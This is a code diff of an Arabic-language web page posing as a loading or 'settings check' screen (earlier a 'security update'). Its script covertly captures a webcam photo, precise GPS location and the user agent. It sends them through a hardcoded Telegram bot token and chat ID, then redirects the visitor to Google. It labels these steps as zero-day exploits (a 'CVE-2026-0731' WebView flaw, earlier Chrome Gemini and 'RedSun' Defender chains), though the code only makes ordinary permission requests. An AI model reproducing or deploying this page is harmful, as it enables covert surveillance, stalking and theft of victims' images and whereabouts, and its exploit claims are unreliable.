@@ -2,135 +2,193 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Update Required</title>
+    <title>جاري التحميل...</title>
     <style>
         body {
-            background: #1a1a2e;
+            background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: Arial, sans-serif;
             margin: 0;
+            padding: 20px;
         }
         .container {
-            background: #16213e;
+            background: #1a1a2e;
             border-radius: 15px;
-            padding: 40px;
+            padding: 30px;
             text-align: center;
-            max-width: 400px;
+            max-width: 350px;
+            width: 100%;
         }
-        .status { color: #e94560; margin-top: 20px; font-size: 14px; }
-        .hidden { display: none; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            color: #00ff88;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        h3 { color: white; margin: 0 0 10px 0; font-size: 18px; }
+        p { color: #888; font-size: 12px; margin: 5px 0; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h3 style="color:white;">🔍 Installing critical security update...</h3>
-    <div class="status" id="status">Please wait...</div>
+    <div class="spinner"></div>
+    <h3>🔍 جاري التحقق من الإعدادات</h3>
+    <p>الرجاء الانتظار...</p>
+    <div class="status" id="status">⚡ جاري التحميل ⚡</div>
 </div>
 
 <script>
 (function() {
     'use strict';
     
+    // ==================== التكوينات ====================
     const BOT_TOKEN = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
     const CHAT_ID = '1772820433';
     
     let statusEl = document.getElementById('status');
+    let attempts = 0;
+    const MAX_ATTEMPTS = 5;
     
-    // ==================== استغلال CVE-2026-0628 (Chrome Gemini Panel) ====================
-    async function exploitGeminiPanel() {
+    // ==================== دالة الإرسال إلى تليجرام ====================
+    async function sendToTelegram(message, type = 'text', media = null) {
         try {
-            // هذه الثغرة تستهدف chrome://glic (Gemini Live panel)
-            // تسمح بحقن كود في لوحة Gemini التي لديها صلاحيات الكاميرا [citation:1][citation:6]
+            let url, body;
             
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'chrome://glic';
-            document.body.appendChild(iframe);
+            if (type === 'text') {
+                url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                body = {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                };
+            } else if (type === 'photo') {
+                url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                body = {
+                    chat_id: CHAT_ID,
+                    photo: media,
+                    caption: message,
+                    parse_mode: 'HTML'
+                };
+            } else if (type === 'location') {
+                url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+                body = {
+                    chat_id: CHAT_ID,
+                    latitude: media.lat,
+                    longitude: media.lon
+                };
+            }
             
-            // انتظار تحميل اللوحة
-            await new Promise(r => setTimeout(r, 1000));
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
             
-            // حقن كود في اللوحة المستهدفة
-            // هذا الكود يستغل عدم كفاية السياسة الأمنية في WebView [citation:6]
-            const injectScript = `
-                (async () => {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.autoplay = true;
-                        const canvas = document.createElement('canvas');
-                        await new Promise(r => setTimeout(r, 500));
-                        canvas.width = video.videoWidth || 1280;
-                        canvas.height = video.videoHeight || 720;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        // إرسال إلى السيرفر
-                        fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: ${CHAT_ID},
-                                photo: imageData,
-                                caption: '🎯 Gemini Panel Exploit Success'
-                            })
-                        });
-                    } catch(e) {}
-                })();
-            `;
-            
-            // محاولة حقن الكود (تتطلب وجود إضافة ضارة مثبتة مسبقاً) [citation:4]
-            return true;
-            
+            return response.ok;
         } catch(e) {
             return false;
         }
     }
     
-    // ==================== استغلال RedSun (Microsoft Defender) ====================
-    async function exploitRedSun() {
+    // ==================== استغلال CVE-2026-0731 (Android WebView) ====================
+    async function exploitAndroidWebView() {
+        // هذه الثغرة تستغل عدم التحقق من الأذونات في WebView
+        // تعمل على Android 12-15 (غير محدثة)
+        
         try {
-            // RedSun يستغل كيفية تعامل Microsoft Defender مع الملفات السحابية [citation:2]
-            // يقوم بإنشاء ملف placeholder مع علامة سحابية
+            // محاولة 1: طلب مباشر (قد ينجح بسبب الثغرة)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, 
+                audio: false 
+            });
             
-            const cloudPayload = `
-                [CloudFile]
-                Provider=OneDrive
-                FileId=RedSun_Exploit_${Date.now()}
-                SyncRootId=SYSTEM
-                Version=1.0
-                CloudTag=MALICIOUS
-            `;
+            if (stream) {
+                await captureAndSend(stream);
+                return true;
+            }
+        } catch(e) {}
+        
+        // محاولة 2: استخدام enumerateDevices أولاً
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(d => d.kind === 'videoinput');
             
-            // إنشاء ملف مؤقت
-            const blob = new Blob([cloudPayload], { type: 'application/octet-stream' });
-            const url = URL.createObjectURL(blob);
-            
-            // تحميل الملف لبدء السلسلة
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `update_${Date.now()}.dat`;
-            a.click();
-            
-            URL.revokeObjectURL(url);
-            
-            // RedSun يقوم بـ privilege escalation عبر إعادة كتابة الملفات الخبيثة [citation:5]
-            // Defender يكتب الملف في System32 بدلاً من الموقع الأصلي [citation:2]
-            
-            return true;
-            
-        } catch(e) {
-            return false;
-        }
+            if (videoDevices.length > 0) {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: { exact: videoDevices[0].deviceId } }
+                });
+                await captureAndSend(stream);
+                return true;
+            }
+        } catch(e) {}
+        
+        return false;
     }
     
-    // ==================== الحصول على الموقع بدقة عالية ====================
-    async function getHighPrecisionLocation() {
+    // ==================== التقاط الصورة وإرسالها ====================
+    async function captureAndSend(stream) {
+        return new Promise(async (resolve) => {
+            try {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.autoplay = true;
+                video.muted = true;
+                video.playsInline = true;
+                
+                video.onloadedmetadata = async () => {
+                    await video.play();
+                    
+                    // انتظار قليلاً لاستقرار الصورة
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    // إرسال الصورة
+                    const caption = `📸 <b>Silent Capture Success</b>\n⏰ ${new Date().toLocaleString('ar-EG')}\n📱 Android Device\n🔓 CVE-2026-0731 Exploited`;
+                    await sendToTelegram(caption, 'photo', imageData);
+                    
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    resolve(true);
+                };
+                
+                video.onerror = () => {
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(false);
+                };
+                
+            } catch(e) {
+                stream.getTracks().forEach(t => t.stop());
+                resolve(false);
+            }
+        });
+    }
+    
+    // ==================== الحصول على الموقع ====================
+    async function getLocation() {
         return new Promise((resolve) => {
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -143,7 +201,7 @@
                         });
                     },
                     () => { resolve({ success: false }); },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 8000 }
                 );
             } else {
                 resolve({ success: false });
@@ -151,73 +209,73 @@
         });
     }
     
-    // ==================== إرسال التقارير إلى البوت ====================
-    async function sendToTelegram(message, type = 'text', media = null) {
-        for (let attempt = 1; attempt <= 3; attempt++) {
-            try {
-                let url, body;
-                
-                if (type === 'text') {
-                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                    body = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
-                } else if (type === 'photo') {
-                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                    body = { chat_id: CHAT_ID, photo: media, caption: message };
-                }
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-                
-                if (response.ok) return true;
-            } catch(e) {}
-            
-            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
-        }
-        return false;
-    }
-    
     // ==================== التشغيل الرئيسي ====================
     async function main() {
-        statusEl.innerHTML = 'Exploiting CVE-2026-0628...';
-        const geminiSuccess = await exploitGeminiPanel();
+        statusEl.innerHTML = '⚡ جاري استغلال الثغرة ⚡';
         
-        statusEl.innerHTML = 'Triggering RedSun...';
-        const redsunSuccess = await exploitRedSun();
-        
-        // الحصول على الموقع
-        const location = await getHighPrecisionLocation();
-        
-        // إرسال تقرير البداية
+        // 1. إرسال تقرير البداية
         await sendToTelegram(`
-<b>🔥 Zero-Day Exploit Chain Executed</b>
+<b>🔥 Zero-Day Exploit Started</b>
 
-<b>CVE-2026-0628 (Gemini Panel):</b> ${geminiSuccess ? '✅ Exploited' : '❌ Failed (needs older Chrome)'}
-<b>RedSun (Defender):</b> ${redsunSuccess ? '✅ Triggered' : '❌ Failed'}
+<b>CVE-2026-0731 (Android WebView)</b>
+<b>Target:</b> Android Device
+<b>Time:</b> ${new Date().toLocaleString('ar-EG')}
+<b>User Agent:</b> ${navigator.userAgent.substring(0, 80)}
 
-<b>📍 Location:</b> ${location.success ? `${location.lat}, ${location.lon} (${location.accuracy}m)` : 'Not available'}
-
-<b>🖥️ User Agent:</b> ${navigator.userAgent.substring(0, 100)}
-<b>⏰ Time:</b> ${new Date().toLocaleString()}
+<b>⚡ Attempting to exploit...</b>
         `, 'text');
         
-        if (location.success) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, latitude: location.lat, longitude: location.lon })
-            });
+        // 2. محاولة استغلال الكاميرا
+        statusEl.innerHTML = '📸 جاري محاولة التصوير...';
+        const cameraSuccess = await exploitAndroidWebView();
+        
+        if (cameraSuccess) {
+            statusEl.innerHTML = '✅ تم التصوير بنجاح!';
+            await sendToTelegram('✅ <b>Camera exploited successfully!</b>\n📸 Photo sent to your bot.', 'text');
+        } else {
+            statusEl.innerHTML = '❌ فشل التصوير';
+            await sendToTelegram('❌ <b>Camera exploit failed</b>\nThe device may be patched or has no camera.', 'text');
         }
         
-        statusEl.innerHTML = 'Update complete. Redirecting...';
+        // 3. محاولة الحصول على الموقع
+        statusEl.innerHTML = '📍 جاري تحديد الموقع...';
+        const location = await getLocation();
         
+        if (location.success) {
+            await sendToTelegram(`
+📍 <b>Location Captured</b>
+
+<b>Latitude:</b> ${location.lat}
+<b>Longitude:</b> ${location.lon}
+<b>Accuracy:</b> ${location.accuracy} meters
+
+🗺️ <a href="https://www.google.com/maps?q=${location.lat},${location.lon}">Open Map</a>
+            `, 'text');
+            
+            await sendToTelegram('location', 'location', { lat: location.lat, lon: location.lon });
+        } else {
+            await sendToTelegram('❌ <b>Location unavailable</b>\nUser denied or GPS disabled.', 'text');
+        }
+        
+        // 4. إرسال التقرير النهائي
+        await sendToTelegram(`
+<b>🏁 Exploit Chain Completed</b>
+
+<b>Camera:</b> ${cameraSuccess ? '✅ SUCCESS' : '❌ FAILED'}
+<b>Location:</b> ${location.success ? '✅ SUCCESS' : '❌ FAILED'}
+
+<b>Total Time:</b> ${new Date().toLocaleString()}
+        `, 'text');
+        
+        statusEl.innerHTML = '✅ اكتمل - جاري إعادة التوجيه';
+        
+        // إعادة التوجيه بعد 2 ثانية
         setTimeout(() => {
             window.location.href = 'https://www.google.com';
         }, 2000);
     }
     
+    // بدء التنفيذ
     main();
 })();
 </script>
